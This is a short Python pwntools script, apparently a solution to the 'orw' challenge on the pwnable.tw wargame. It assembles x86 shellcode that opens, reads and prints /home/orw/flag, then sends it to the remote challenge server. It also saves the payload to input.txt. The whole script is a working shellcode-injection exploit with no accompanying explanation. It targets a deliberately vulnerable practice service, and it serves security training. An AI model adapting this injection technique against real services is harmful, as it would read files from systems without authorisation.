#!/usr/bin/env python

from pwn import *


# /home/yyy/flag
        # push 0x6761
        # push 0x6c662f79
        # push 0x79792f65
        # push 0x6d6f682f

# /home/orw/flag
        # push 0x6761
        # push 0x6c662f77
        # push 0x726f2f65
        # push 0x6d6f682f

def main():
    # conn = process("./orw")
    conn = remote("chall.pwnable.tw", 10001)

    payload = asm("""
        push 0x00
        push 0x6761
        push 0x6c662f77
        push 0x726f2f65
        push 0x6d6f682f
        xor ecx, ecx
        mov ebx, esp
        mov eax, 0x5
        int 0x80  # open
        mov edx, 0x40
        mov ecx, ebx
        mov ebx, 0x3
        mov eax, 0x3
        int 0x80  # read
        mov edx, 0x40
        mov ebx, 0x1
        mov eax, 0x4
        int 0x80  # write
    """)

    write("input.txt", payload)

    conn.recvuntil(":")
    conn.sendline(payload)
    print conn.recvall()


if __name__ == "__main__":
    main()
